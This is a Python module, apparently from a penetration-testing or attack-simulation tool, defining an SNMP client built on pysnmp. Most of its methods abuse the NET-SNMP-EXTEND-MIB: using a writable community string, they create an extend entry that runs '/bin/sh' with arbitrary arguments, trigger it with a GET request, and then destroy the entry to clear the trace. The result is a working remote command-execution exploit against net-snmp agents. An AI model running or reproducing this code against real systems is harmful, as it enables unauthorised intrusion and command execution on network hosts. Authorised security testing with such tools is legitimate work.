from dataclasses import dataclass
from ipaddress import IPv4Address
from os.path import dirname
from typing import Iterator, Tuple

from pysnmp.hlapi import (
    CommunityData,
    ContextData,
    ObjectIdentity,
    ObjectType,
    SnmpEngine,
    UdpTransportTarget,
    getCmd,
    setCmd,
)
from pysnmp.proto.errind import ErrorIndication, requestTimedOut
from pysnmp.smi import builder

SNMP_EXTEND_MIB = "NET-SNMP-EXTEND-MIB"


class SNMPRequestTimedOut(Exception):
    pass


@dataclass
class SNMPResult:
    errorIndication: ErrorIndication  # True value indicates SNMP engine error
    errorStatus: str  # True value indicates SNMP PDU error
    errorIndex: int  # If nonzero, PDU error index for varBinds[errorIndex-1]
    varBinds: Tuple[ObjectType, ...]  # MIB variables returned in SNMP response


class SNMPClient:
    def __init__(self, snmp_request_timeout: float, snmp_retries: int):
        """
        :param snmp_request_timeout: The timeout for SNMP requests, in seconds
        :param snmp_retries: The number of retries for SNMP requests
        """
        self._engine = SnmpEngine()

        mib_builder = self._engine.getMibBuilder()
        mib_builder.addMibSources(builder.DirMibSource(dirname(__file__)))
        self._snmp_request_timeout = snmp_request_timeout
        self._snmp_retries = snmp_retries

    def get_system_name(self, target_ip: IPv4Address, community_string: str) -> str:
        """
        Gets the system name of the target

        :param target_ip: The IP address of the target
        :param community_string: The community string to use
        :return: A string representing the system name
        :raises SNMPRequestTimedOut: If the request times out
        :raises: Exception if the command failed
        """
        cmd = getCmd(
            self._engine,
            CommunityData(community_string),
            UdpTransportTarget(
                (str(target_ip), 161),
                timeout=self._snmp_request_timeout,
                retries=self._snmp_retries,
            ),
            ContextData(),
            ObjectType(ObjectIdentity("SNMPv2-MIB", "sysName", 0)),
        )

        result = self._dispatch(cmd)
        _, name = result.varBinds[0]
        return str(name)

    def set_command(
        self,
        target_ip: IPv4Address,
        command_name: str,
        community_string: str,
        command: str,
    ):
        """
        Sets a command with the given name in the MIB table

        :param target_ip: The IP address of the target
        :param command_name: The name of the command to set
        :param community_string: The community string to use
        :param command: The command to set
        :raises SNMPRequestTimedOut: If the request times out
        :raises: Exception if the command failed
        """
        cmd = setCmd(
            self._engine,
            CommunityData(community_string),
            UdpTransportTarget(
                (str(target_ip), 161),
                timeout=self._snmp_request_timeout,
                retries=self._snmp_retries,
            ),
            ContextData(),
            ObjectType(
                ObjectIdentity(SNMP_EXTEND_MIB, "nsExtendStatus", f'"{command_name}"'),
                "createAndGo",
            ),
            ObjectType(
                ObjectIdentity(SNMP_EXTEND_MIB, "nsExtendCommand", f'"{command_name}"'),
                "/bin/sh",
            ),
            ObjectType(
                ObjectIdentity(SNMP_EXTEND_MIB, "nsExtendArgs", f'"{command_name}"'),
                command,
            ),
            lookupNames=True,
            lookupValues=True,
        )
        self._dispatch(cmd)

    def execute_command(self, target_ip: IPv4Address, command_name: str, community_string: str):
        """
        Executes the command with the given name. The command must have been set previously

        :param target_ip: The IP address of the target
        :param command_name: The name of the command to clear
        :param community_string: The community string to use
        :raises SNMPRequestTimedOut: If the request times out
        :raises: Exception if the command failed
        """
        # Other potential NET-SNMP-EXTEND-MIB options:
        # - nsExtendStatus
        # - nsExtendOutput1Line
        # - nsExtendOutputFull
        # - nsExtendOutNumLines
        # - nsExtendOutLine
        cmd = getCmd(
            self._engine,
            CommunityData(community_string),
            UdpTransportTarget(
                (str(target_ip), 161),
                timeout=self._snmp_request_timeout,
                retries=self._snmp_retries,
            ),
            ContextData(),
            ObjectType(ObjectIdentity(SNMP_EXTEND_MIB, "nsExtendNumEntries", 0)),
            ObjectType(ObjectIdentity(SNMP_EXTEND_MIB, "nsExtendCommand", f'"{command_name}"')),
            ObjectType(ObjectIdentity(SNMP_EXTEND_MIB, "nsExtendArgs", f'"{command_name}"')),
            ObjectType(ObjectIdentity(SNMP_EXTEND_MIB, "nsExtendInput", f'"{command_name}"')),
            ObjectType(ObjectIdentity(SNMP_EXTEND_MIB, "nsExtendResult", f'"{command_name}"')),
        )
        self._dispatch(cmd)

    def clear_command(self, target_ip: IPv4Address, command_name: str, community_string: str):
        """
        Clears the command with the given name from the MIB table. The command must have been set
        previously

        :param target_ip: The IP address of the target
        :param command_name: The name of the command to clear
        :param community_string: The community string to use
        :raises SNMPRequestTimedOut: If the request times out
        :raises: Exception if the command failed
        """
        cmd = setCmd(
            self._engine,
            CommunityData(community_string),
            UdpTransportTarget(
                (str(target_ip), 161),
                timeout=self._snmp_request_timeout,
                retries=self._snmp_retries,
            ),
            ContextData(),
            ObjectType(
                ObjectIdentity(SNMP_EXTEND_MIB, "nsExtendStatus", f'"{command_name}"'),
                "destroy",
            ),
        )
        self._dispatch(cmd)

    def _dispatch(self, command_iterator: Iterator[Tuple]) -> SNMPResult:
        result = SNMPResult(*next(command_iterator))

        if result.errorIndication:
            if result.errorIndication == requestTimedOut:
                raise SNMPRequestTimedOut(str(requestTimedOut))
            raise result.errorIndication
        elif result.errorStatus:
            vars = "?"
            if result.errorIndex:
                name, value = result.varBinds[int(result.errorIndex) - 1]
                vars = f"{name.prettyPrint()} = {value.prettyPrint()}"
            message = f"{result.errorStatus} at " f"{vars}"

            raise Exception(f"Failed to execute command: {message}")

        return result
